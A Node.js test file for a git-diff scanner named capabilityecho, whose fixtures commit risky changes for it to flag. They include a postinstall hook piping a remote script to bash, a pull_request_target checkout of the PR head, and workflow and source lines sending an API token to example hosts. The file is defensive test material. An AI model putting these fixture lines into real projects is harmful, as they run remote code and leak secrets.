import test from 'node:test';
import assert from 'node:assert/strict';
import { execFile } from 'node:child_process';
import { join, dirname } from 'node:path';
import { fileURLToPath } from 'node:url';
import { promisify } from 'node:util';
import { makeGitRepo } from 'agent-gov-core/test-utils';

const execFileAsync = promisify(execFile);
const testDir = dirname(fileURLToPath(import.meta.url));
const packageRoot = join(testDir, '..');

async function runDiff(repo, base, head) {
  const { stdout } = await execFileAsync(
    process.execPath,
    ['dist/index.js', 'diff', '--repo', repo, '--base', base, '--head', head, '--format', 'json'],
    { cwd: packageRoot }
  );
  return JSON.parse(stdout);
}

function projectFiles({ packageJson, workflow, source }) {
  return {
    'package.json': `${JSON.stringify(packageJson, null, 2)}\n`,
    '.github/workflows/ci.yml': `${workflow}\n`,
    'src/client.ts': source,
  };
}

test('CLI diffs capability drift between git refs without agent config changes', async () => {
  const fx = await makeGitRepo({
    prefix: 'capabilityecho-git-',
    initialFiles: projectFiles({
      packageJson: { name: 'git-fixture', private: true, scripts: { test: 'vitest' } },
      workflow: [
        'name: CI',
        '',
        'permissions:',
        '  contents: read',
        '',
        'jobs:',
        '  test:',
        '    runs-on: ubuntu-latest',
        '    steps:',
        '      - run: npm test'
      ].join('\n'),
      source: "export function hello() {\n  return 'ok';\n}\n"
    }),
    initialMessage: 'base app',
  });
  try {
    const base = await fx.head();
    const head = await fx.commit(
      projectFiles({
        packageJson: {
          name: 'git-fixture',
          private: true,
          scripts: {
            test: 'vitest',
            postinstall: 'curl https://install.example.com/setup.sh | bash'
          }
        },
        workflow: [
          'name: CI',
          '',
          'permissions:',
          '  contents: write',
          '',
          'jobs:',
          '  test:',
          '    runs-on: ubuntu-latest',
          '    steps:',
          '      - run: npm test',
          '      - run: curl https://example.com/bootstrap.sh'
        ].join('\n'),
        source: "export async function sync() {\n  await fetch('https://api.example.com/v1/events');\n}\n"
      }),
      'add capability drift'
    );

    const report = await runDiff(fx.repo, base, head);

    assert.equal(report.rating, 'critical');
    assert.ok(report.findings.some((finding) => finding.kind === 'capability_echo.external_fetch_added'));
    assert.ok(report.findings.some((finding) => finding.kind === 'capability_echo.workflow_permission_write'));
    assert.ok(report.findings.some((finding) => finding.kind === 'capability_echo.lifecycle_script_added'));
  } finally {
    await fx.cleanup();
  }
});

test('CLI ignores AI-agent config changes while still scanning executable surfaces', async () => {
  const fx = await makeGitRepo({
    prefix: 'capabilityecho-agent-config-',
    initialFiles: {
      ...projectFiles({
        packageJson: { name: 'agent-config-fixture', private: true, scripts: { test: 'vitest' } },
        workflow: [
          'name: CI',
          '',
          'permissions:',
          '  contents: read',
          '',
          'jobs:',
          '  test:',
          '    runs-on: ubuntu-latest',
          '    steps:',
          '      - run: npm test'
        ].join('\n'),
        source: "export function hello() {\n  return 'ok';\n}\n"
      }),
      '.mcp.json': '{"servers":{}}\n',
      '.claude/settings.json': '{"permissions":[]}\n',
    },
    initialMessage: 'base app',
  });
  try {
    const base = await fx.head();
    const head = await fx.commit(
      {
        ...projectFiles({
          packageJson: {
            name: 'agent-config-fixture',
            private: true,
            scripts: {
              test: 'vitest',
              postinstall: 'curl https://install.example.com/setup.sh | bash'
            }
          },
          workflow: [
            'name: CI',
            '',
            'permissions:',
            '  contents: write',
            '',
            'jobs:',
            '  test:',
            '    runs-on: ubuntu-latest',
            '    steps:',
            '      - run: npm test',
            '      - run: curl https://example.com/bootstrap.sh'
          ].join('\n'),
          source: "export async function sync() {\n  await fetch('https://api.example.com/v1/events');\n}\n"
        }),
        '.mcp.json': '{"servers":{"local":{"command":"node","args":["tool.js"]}}}\n',
        '.claude/settings.json': '{"permissions":["Bash(*)"]}\n',
      },
      'add executable capability drift and agent config drift'
    );

    const report = await runDiff(fx.repo, base, head);

    assert.equal(report.changedFileCount, 3);
    assert.deepEqual(new Set(report.scannedSurfaces), new Set(['source', 'package', 'workflow']));
    assert.ok(report.excludedSurfaces.includes('AI-agent config'));
    assert.ok(report.findings.some((finding) => finding.surface === 'source'));
    assert.ok(report.findings.some((finding) => finding.surface === 'package'));
    assert.ok(report.findings.some((finding) => finding.surface === 'workflow'));
    assert.ok(report.findings.every((finding) => !finding.file.includes('.mcp') && !finding.file.includes('.claude')));
  } finally {
    await fx.cleanup();
  }
});

test('CLI detects package capability drift from compared git refs, not the current checkout', async () => {
  const fx = await makeGitRepo({
    prefix: 'capabilityecho-package-ref-',
    initialFiles: projectFiles({
      packageJson: { name: 'package-ref-fixture', private: true, scripts: { test: 'vitest' } },
      workflow: [
        'name: CI',
        '',
        'jobs:',
        '  test:',
        '    runs-on: ubuntu-latest',
        '    steps:',
        '      - run: npm test'
      ].join('\n'),
      source: "export function hello() {\n  return 'ok';\n}\n"
    }),
    initialMessage: 'base app',
  });
  try {
    const base = await fx.head();
    const head = await fx.commit(
      {
        'tools/agent/package.json': `${JSON.stringify(
          {
            name: 'agent-tooling',
            private: true,
            scripts: { postinstall: 'curl https://install.example.com/setup.sh | bash' },
            dependencies: { puppeteer: '^22.0.0' }
          },
          null,
          2
        )}\n`,
      },
      'add agent package capability drift'
    );
    await fx.git('checkout', base);

    const report = await runDiff(fx.repo, base, head);

    assert.equal(report.changedFileCount, 1);
    assert.deepEqual(report.scannedSurfaces, ['package']);
    assert.ok(report.findings.some((finding) => finding.kind === 'capability_echo.lifecycle_script_added'));
    assert.ok(report.findings.some((finding) => finding.kind === 'capability_echo.high_capability_dep_added'));
    assert.ok(report.findings.every((finding) => finding.file === 'tools/agent/package.json'));
  } finally {
    await fx.cleanup();
  }
});

test('CLI flags PR-head checkout added to an existing pull_request_target workflow', async () => {
  const baseProject = projectFiles({
    packageJson: { name: 'workflow-context-fixture', private: true, scripts: { test: 'vitest' } },
    workflow: [
      'name: PR Audit',
      '',
      'on:',
      '  pull_request_target:',
      '',
      'jobs:',
      '  audit:',
      '    runs-on: ubuntu-latest',
      '    steps:',
      '      - uses: actions/checkout@v6'
    ].join('\n'),
    source: "export function hello() {\n  return 'ok';\n}\n"
  });
  const fx = await makeGitRepo({
    prefix: 'capabilityecho-workflow-context-',
    initialFiles: baseProject,
    initialMessage: 'base pull request target workflow',
  });
  try {
    const base = await fx.head();
    const head = await fx.commit(
      projectFiles({
        packageJson: { name: 'workflow-context-fixture', private: true, scripts: { test: 'vitest' } },
        workflow: [
          'name: PR Audit',
          '',
          'on:',
          '  pull_request_target:',
          '',
          'jobs:',
          '  audit:',
          '    runs-on: ubuntu-latest',
          '    steps:',
          '      - uses: actions/checkout@v6',
          '        with:',
          '          ref: ${{ github.event.pull_request.head.sha }}'
        ].join('\n'),
        source: "export function hello() {\n  return 'ok';\n}\n"
      }),
      'checkout pr head under target workflow'
    );

    const report = await runDiff(fx.repo, base, head);
    const finding = report.findings.find((item) => item.kind === 'capability_echo.workflow_pr_head_checkout_on_target');
    assert.ok(finding);
    assert.equal(finding.file, '.github/workflows/ci.yml');
    assert.equal(finding.line, 12);
    assert.equal(finding.severity, 'high');
  } finally {
    await fx.cleanup();
  }
});

test('CLI flags external requests using existing workflow secret env vars', async () => {
  const baseWorkflow = [
    'name: Deploy',
    '',
    'jobs:',
    '  deploy:',
    '    runs-on: ubuntu-latest',
    '    env:',
    '      API_TOKEN: ${{ secrets.API_TOKEN }}',
    '    steps:',
    '      - run: npm test'
  ].join('\n');
  const fx = await makeGitRepo({
    prefix: 'capabilityecho-workflow-secret-env-',
    initialFiles: projectFiles({
      packageJson: { name: 'workflow-secret-env-fixture', private: true, scripts: { test: 'vitest' } },
      workflow: baseWorkflow,
      source: "export function hello() {\n  return 'ok';\n}\n"
    }),
    initialMessage: 'base workflow secret env',
  });
  try {
    const base = await fx.head();
    const head = await fx.commit(
      projectFiles({
        packageJson: { name: 'workflow-secret-env-fixture', private: true, scripts: { test: 'vitest' } },
        workflow: [
          ...baseWorkflow.split('\n'),
          '      - run: curl https://example.com/hook -H "Authorization: Bearer $API_TOKEN"'
        ].join('\n'),
        source: "export function hello() {\n  return 'ok';\n}\n"
      }),
      'add secret env outbound request'
    );

    const report = await runDiff(fx.repo, base, head);
    const finding = report.findings.find((item) => item.kind === 'capability_echo.workflow_secret_exfil_pattern');
    assert.ok(finding);
    assert.equal(finding.file, '.github/workflows/ci.yml');
    assert.equal(finding.line, 10);
    assert.equal(finding.severity, 'high');
  } finally {
    await fx.cleanup();
  }
});

test('CLI flags external fetches using existing source env secret variables', async () => {
  const baseWorkflow = [
    'name: CI',
    '',
    'jobs:',
    '  test:',
    '    runs-on: ubuntu-latest',
    '    steps:',
    '      - run: npm test'
  ].join('\n');
  const baseSource = [
    'const apiToken = process.env.API_TOKEN;',
    '',
    'export async function sync() {',
    '  return "ok";',
    '}'
  ].join('\n');
  const fx = await makeGitRepo({
    prefix: 'capabilityecho-source-secret-var-',
    initialFiles: projectFiles({
      packageJson: { name: 'source-secret-var-fixture', private: true, scripts: { test: 'vitest' } },
      workflow: baseWorkflow,
      source: baseSource,
    }),
    initialMessage: 'base source env secret',
  });
  try {
    const base = await fx.head();
    const head = await fx.commit(
      projectFiles({
        packageJson: { name: 'source-secret-var-fixture', private: true, scripts: { test: 'vitest' } },
        workflow: baseWorkflow,
        source: [
          'const apiToken = process.env.API_TOKEN;',
          '',
          'export async function sync() {',
          '  await fetch("https://collector.example.com/events", { headers: { Authorization: `Bearer ${apiToken}` } });',
          '  return "ok";',
          '}'
        ].join('\n'),
      }),
      'send env secret variable externally'
    );

    const report = await runDiff(fx.repo, base, head);
    const finding = report.findings.find((item) => item.kind === 'capability_echo.source_secret_exfil_pattern');
    assert.ok(finding);
    assert.equal(finding.file, 'src/client.ts');
    assert.equal(finding.line, 4);
    assert.equal(finding.severity, 'high');
  } finally {
    await fx.cleanup();
  }
});

test('CLI flags Python external requests using existing source env secret variables', async () => {
  const baseWorkflow = [
    'name: CI',
    '',
    'jobs:',
    '  test:',
    '    runs-on: ubuntu-latest',
    '    steps:',
    '      - run: npm test'
  ].join('\n');
  const basePy = [
    'import os',
    'import requests',
    'api_token = os.getenv("API_TOKEN")',
    '',
    'def sync():',
    '    return "ok"'
  ].join('\n');
  const fx = await makeGitRepo({
    prefix: 'capabilityecho-python-secret-var-',
    initialFiles: {
      ...projectFiles({
        packageJson: { name: 'python-secret-var-fixture', private: true, scripts: { test: 'vitest' } },
        workflow: baseWorkflow,
        source: "export function hello() {\n  return 'ok';\n}\n",
      }),
      'src/agent.py': basePy,
    },
    initialMessage: 'base python env secret',
  });
  try {
    const base = await fx.head();
    const head = await fx.commit(
      {
        ...projectFiles({
          packageJson: { name: 'python-secret-var-fixture', private: true, scripts: { test: 'vitest' } },
          workflow: baseWorkflow,
          source: "export function hello() {\n  return 'ok';\n}\n",
        }),
        'src/agent.py': [
          'import os',
          'import requests',
          'api_token = os.getenv("API_TOKEN")',
          '',
          'def sync():',
          '    requests.post("https://collector.example.com/events", headers={"Authorization": "Bearer " + api_token})',
          '    return "ok"'
        ].join('\n'),
      },
      'send python env secret variable externally'
    );

    const report = await runDiff(fx.repo, base, head);
    const finding = report.findings.find((item) => item.kind === 'capability_echo.source_secret_exfil_pattern');
    assert.ok(finding);
    assert.equal(finding.file, 'src/agent.py');
    assert.equal(finding.line, 6);
    assert.equal(finding.severity, 'high');
  } finally {
    await fx.cleanup();
  }
});

test('CLI preserves monorepo source paths in findings and annotations', async () => {
  const fx = await makeGitRepo({
    prefix: 'capabilityecho-monorepo-',
    initialFiles: {
      'package.json': `${JSON.stringify({ name: 'monorepo-fixture', private: true }, null, 2)}\n`,
      'apps/web/src/api.ts': "export function hello() {\n  return 'ok';\n}\n",
      'packages/core/src/util.ts': "export function tag() {\n  return 'base';\n}\n",
    },
    initialMessage: 'base monorepo',
  });
  try {
    const base = await fx.head();
    const head = await fx.commit(
      {
        'package.json': `${JSON.stringify({ name: 'monorepo-fixture', private: true }, null, 2)}\n`,
        'apps/web/src/api.ts':
          "export async function sync() {\n  await fetch('https://api.example.com/v1/events');\n}\n",
        'packages/core/src/util.ts':
          "export function tag() {\n  return 'base';\n}\nexport async function pull() {\n  await fetch('https://collector.example.com/pull');\n}\n",
      },
      'add external fetches in monorepo paths'
    );

    const report = await runDiff(fx.repo, base, head);
    const webFinding = report.findings.find(
      (finding) => finding.kind === 'capability_echo.external_fetch_added' && finding.file.includes('apps/web')
    );
    const coreFinding = report.findings.find(
      (finding) => finding.kind === 'capability_echo.external_fetch_added' && finding.file.includes('packages/core')
    );
    assert.ok(webFinding, 'expected a finding under apps/web');
    assert.equal(webFinding.file, 'apps/web/src/api.ts');
    assert.ok(coreFinding, 'expected a finding under packages/core');
    assert.equal(coreFinding.file, 'packages/core/src/util.ts');
  } finally {
    await fx.cleanup();
  }
});

test('git diff exposes missing refs as setup errors', async () => {
  const fx = await makeGitRepo({
    prefix: 'capabilityecho-git-setup-error-',
    initialFiles: projectFiles({
      packageJson: { name: 'git-setup-error-fixture', private: true, scripts: { test: 'vitest' } },
      workflow: [
        'name: CI',
        '',
        'permissions:',
        '  contents: read',
        '',
        'jobs:',
        '  test:',
        '    runs-on: ubuntu-latest',
        '    steps:',
        '      - run: npm test'
      ].join('\n'),
      source: "export function hello() {\n  return 'ok';\n}\n"
    }),
    initialMessage: 'base app',
  });
  try {
    const gitDiff = await import('../dist/git-diff.js');
    assert.equal(typeof gitDiff.GitDiffSetupError, 'function');

    await assert.rejects(
      () => gitDiff.collectGitDiff(fx.repo, 'missing-base-ref', 'missing-head-ref'),
      (error) =>
        error instanceof gitDiff.GitDiffSetupError &&
        /base 'missing-base-ref'/.test(error.message) &&
        /head 'missing-head-ref'/.test(error.message)
    );
  } finally {
    await fx.cleanup();
  }
});
